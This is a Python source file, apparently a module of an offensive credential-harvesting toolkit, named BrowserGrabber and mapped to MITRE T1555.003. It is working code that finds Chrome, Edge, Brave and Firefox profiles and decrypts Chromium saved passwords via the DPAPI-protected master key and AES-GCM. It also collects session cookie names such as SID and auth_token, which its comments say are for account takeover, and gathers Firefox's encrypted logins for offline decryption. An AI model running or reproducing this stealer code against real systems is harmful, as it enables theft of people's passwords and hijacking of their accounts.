"""
BrowserGrabber — Extract saved credentials from web browsers

Targets:
- Chromium (Chrome, Edge, Brave):
  - Login Data (SQLite) → saved passwords (encrypted with DPAPI / AES-GCM)
  - Cookies (SQLite) → session cookies for account takeover
  - Local State (JSON) → AES state key (Chrome 80+)
- Firefox:
  - logins.json → encrypted saved passwords
  - key4.db (SQLite) → encryption key (NSS/PKCS#11)
  - cookies.sqlite → session cookies

Chrome 80+ encryption:
  1. Master key stored in Local State JSON, encrypted with DPAPI
  2. Each password encrypted with AES-256-GCM using the master key
  3. Format: "v10" + 12-byte nonce + ciphertext + 16-byte tag

MITRE ATT&CK: T1555.003 (Credentials from Web Browsers)
"""

from __future__ import annotations

import base64
import json
import os
import re

from .base import GrabberContext, GrabberModule
from .models import ExtractedCredential, GrabberResult, GrabberStatus, PrivilegeLevel
from .utils import safe_read_text, safe_sqlite_close, safe_sqlite_read


class BrowserGrabber(GrabberModule):
    name = "browser"
    description = "Extract saved passwords and cookies from Chrome, Edge, Brave, Firefox"
    min_privilege = PrivilegeLevel.USER
    supported_platforms = ("Windows", "Darwin", "Linux")
    default_enabled = True

    # (browser_name, user_data_dir_template)
    _CHROMIUM_BROWSERS: list[tuple[str, str]] = [
        ("Chrome", "{localappdata}/Google/Chrome/User Data"),
        ("Chrome", "{home}/Library/Application Support/Google/Chrome"),
        ("Chrome", "{home}/.config/google-chrome"),
        ("Edge", "{localappdata}/Microsoft/Edge/User Data"),
        ("Edge", "{home}/Library/Application Support/Microsoft Edge"),
        ("Brave", "{localappdata}/BraveSoftware/Brave-Browser/User Data"),
        ("Brave", "{home}/Library/Application Support/BraveSoftware/Brave-Browser"),
    ]

    _FIREFOX_PROFILES: list[str] = [
        "{appdata}/Mozilla/Firefox/Profiles",
        "{home}/Library/Application Support/Firefox/Profiles",
        "{home}/.mozilla/firefox",
    ]

    def preflight_check(self, context: GrabberContext) -> bool:
        for _, template in self._CHROMIUM_BROWSERS:
            path = self._expand(template, context)
            if path and os.path.isdir(path):
                return True
        for template in self._FIREFOX_PROFILES:
            path = self._expand(template, context)
            if path and os.path.isdir(path):
                return True
        return False

    def execute(self, context: GrabberContext) -> GrabberResult:
        result = GrabberResult(module_name=self.name)

        # Chromium-based browsers
        for browser_name, template in self._CHROMIUM_BROWSERS:
            user_data_dir = self._expand(template, context)
            if not user_data_dir or not os.path.isdir(user_data_dir):
                continue

            try:
                master_key = self._get_chromium_master_key(user_data_dir)
                profiles = self._find_chromium_profiles(user_data_dir)

                for profile_path in profiles:
                    creds = self._extract_chromium_logins(profile_path, browser_name, master_key)
                    result.credentials.extend(creds)

                    cookies = self._extract_chromium_cookies(profile_path, browser_name)
                    result.credentials.extend(cookies)

                if result.credentials:
                    login_count = len([c for c in result.credentials
                                       if c.target_application.startswith(browser_name)
                                       and c.credential_type == "password"])
                    cookie_count = len([c for c in result.credentials
                                        if c.target_application.startswith(browser_name)
                                        and c.credential_type == "cookie"])
                    if login_count or cookie_count:
                        result.findings.append(self.make_finding(
                            file_path=user_data_dir,
                            description=f"Extracted {login_count} passwords, {cookie_count} cookies from {browser_name}",
                            score=min(75 * login_count + 25 * cookie_count, 300),
                            matched_value=browser_name,
                        ))

            except Exception as e:
                self.logger.debug(f"Failed to extract from {browser_name}: {e}")
                result.errors.append(f"{browser_name}: {e}")

        # Firefox
        for template in self._FIREFOX_PROFILES:
            profiles_dir = self._expand(template, context)
            if not profiles_dir or not os.path.isdir(profiles_dir):
                continue

            try:
                for profile_name in os.listdir(profiles_dir):
                    profile_path = os.path.join(profiles_dir, profile_name)
                    if not os.path.isdir(profile_path):
                        continue

                    creds = self._extract_firefox_logins(profile_path)
                    result.credentials.extend(creds)

                    if creds:
                        result.findings.append(self.make_finding(
                            file_path=profile_path,
                            description=f"Extracted {len(creds)} credential(s) from Firefox",
                            score=75 * min(len(creds), 3),
                            matched_value="Firefox",
                        ))

            except Exception as e:
                self.logger.debug(f"Firefox extraction failed: {e}")
                result.errors.append(f"Firefox: {e}")

        result.status = GrabberStatus.COMPLETED
        return result

    @staticmethod
    def _expand(template: str, context: GrabberContext) -> str:
        return template.format(
            localappdata=context.appdata_local or "",
            appdata=context.appdata_roaming or "",
            home=context.user_profile_path,
        )

    # --- Chromium ---

    def _get_chromium_master_key(self, user_data_dir: str) -> bytes | None:
        """Extract the AES master key from Chrome's Local State file."""
        local_state_path = os.path.join(user_data_dir, "Local State")
        content = safe_read_text(local_state_path)
        if not content:
            return None

        try:
            data = json.loads(content)
            encrypted_key_b64 = data["os_crypt"]["encrypted_key"]
            encrypted_key = base64.b64decode(encrypted_key_b64)

            # Strip "DPAPI" prefix (5 bytes)
            if encrypted_key[:5] == b"DPAPI":
                encrypted_key = encrypted_key[5:]

            # Decrypt with DPAPI (Windows only)
            from ._crypto import dpapi_decrypt
            master_key = dpapi_decrypt(encrypted_key)
            return master_key

        except (KeyError, json.JSONDecodeError, Exception) as e:
            self.logger.debug(f"Failed to get master key: {e}")
            return None

    @staticmethod
    def _find_chromium_profiles(user_data_dir: str) -> list[str]:
        """Find all Chrome profile directories (Default, Profile 1, etc.)."""
        profiles = []
        try:
            for entry in os.scandir(user_data_dir):
                if entry.is_dir() and (entry.name == "Default" or entry.name.startswith("Profile ")):
                    profiles.append(entry.path)
        except OSError:
            pass
        return profiles

    def _extract_chromium_logins(self, profile_path: str, browser_name: str,
                                  master_key: bytes | None) -> list[ExtractedCredential]:
        """Extract saved passwords from Chromium Login Data SQLite."""
        creds = []
        login_db = os.path.join(profile_path, "Login Data")

        result = safe_sqlite_read(login_db)
        if not result:
            return creds

        conn, tmp_path = result
        try:
            cursor = conn.execute(
                "SELECT origin_url, action_url, username_value, password_value "
                "FROM logins WHERE username_value != '' OR password_value != ''"
            )
            for row in cursor:
                origin = row["origin_url"] or row["action_url"] or ""
                username = row["username_value"] or ""
                encrypted_password = bytes(row["password_value"]) if row["password_value"] else b""

                decrypted = ""
                if encrypted_password:
                    decrypted = self._decrypt_chromium_password(encrypted_password, master_key)

                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application=browser_name,
                    url=origin,
                    username=username,
                    encrypted_value=encrypted_password if not decrypted else b"",
                    decrypted_value=decrypted,
                    mitre_technique="T1555.003",
                ))

        except Exception as e:
            self.logger.debug(f"Login Data query failed: {e}")
        finally:
            safe_sqlite_close(conn, tmp_path)

        return creds

    def _decrypt_chromium_password(self, encrypted: bytes, master_key: bytes | None) -> str:
        """Decrypt a Chromium password blob.

        Chrome 80+ format: "v10" or "v11" prefix + 12-byte nonce + ciphertext + 16-byte tag
        Older format: DPAPI-encrypted blob (no prefix)
        """
        try:
            # Chrome 80+ (v10/v11 prefix)
            if encrypted[:3] in (b"v10", b"v11") and master_key:
                nonce = encrypted[3:15]
                ciphertext_and_tag = encrypted[15:]
                if len(ciphertext_and_tag) < 16:
                    return ""
                ciphertext = ciphertext_and_tag[:-16]
                tag = ciphertext_and_tag[-16:]

                from ._crypto import aes_gcm_decrypt
                plaintext = aes_gcm_decrypt(master_key, nonce, ciphertext, tag)
                if plaintext:
                    return plaintext.decode("utf-8", errors="ignore")

            # Older Chrome (direct DPAPI)
            elif not encrypted[:3].startswith(b"v1"):
                from ._crypto import dpapi_decrypt
                plaintext = dpapi_decrypt(encrypted)
                if plaintext:
                    return plaintext.decode("utf-8", errors="ignore")

        except Exception as e:
            self.logger.debug(f"Password decrypt failed: {e}")

        return ""

    def _extract_chromium_cookies(self, profile_path: str,
                                   browser_name: str) -> list[ExtractedCredential]:
        """Extract high-value cookies (session tokens) from Chromium."""
        creds = []
        # Cookies DB moved to Network/Cookies in newer Chrome versions
        for subpath in ("Network/Cookies", "Cookies"):
            cookie_db = os.path.join(profile_path, subpath)
            result = safe_sqlite_read(cookie_db)
            if not result:
                continue

            conn, tmp_path = result
            try:
                # Only extract session-relevant cookies
                interesting_names = (
                    "SID", "HSID", "SSID", "APISID", "SAPISID",  # Google
                    "JSESSIONID",  # Java apps
                    "connect.sid",  # Express/Node
                    "_session_id", "session",  # Generic
                    "auth_token", "token",  # Auth tokens
                )
                placeholders = ",".join("?" * len(interesting_names))
                cursor = conn.execute(
                    f"SELECT host_key, name, path FROM cookies "
                    f"WHERE name IN ({placeholders}) LIMIT 50",
                    interesting_names,
                )
                for row in cursor:
                    creds.append(ExtractedCredential(
                        source_module=self.name,
                        credential_type="cookie",
                        target_application=f"{browser_name} (cookie)",
                        url=row["host_key"],
                        username=row["name"],
                        notes=f"path={row['path']}",
                        mitre_technique="T1555.003",
                    ))

            except Exception as e:
                self.logger.debug(f"Cookie extraction failed: {e}")
            finally:
                safe_sqlite_close(conn, tmp_path)

            break  # Found cookies DB, no need to try alternate path

        return creds

    # --- Firefox ---

    def _extract_firefox_logins(self, profile_path: str) -> list[ExtractedCredential]:
        """Extract saved logins from Firefox's logins.json.

        Note: Firefox encrypts passwords with NSS/PKCS#11 using the master key
        from key4.db. Full decryption requires the NSS library or reimplementation
        of PBE-SHA256-HMAC-AES256-CBC. We extract the encrypted values and metadata.
        """
        creds = []
        logins_path = os.path.join(profile_path, "logins.json")
        content = safe_read_text(logins_path)
        if not content:
            return creds

        try:
            data = json.loads(content)
            for login in data.get("logins", []):
                hostname = login.get("hostname", "")
                username_enc = login.get("encryptedUsername", "")
                password_enc = login.get("encryptedPassword", "")
                form_submit = login.get("formSubmitURL", "")

                # Store encrypted values for offline decryption
                creds.append(ExtractedCredential(
                    source_module=self.name,
                    credential_type="password",
                    target_application="Firefox",
                    url=hostname or form_submit,
                    encrypted_value=(username_enc + "||" + password_enc).encode(),
                    notes="NSS-encrypted — requires key4.db for decryption",
                    mitre_technique="T1555.003",
                ))

        except (json.JSONDecodeError, KeyError) as e:
            self.logger.debug(f"Firefox logins.json parse failed: {e}")

        return creds
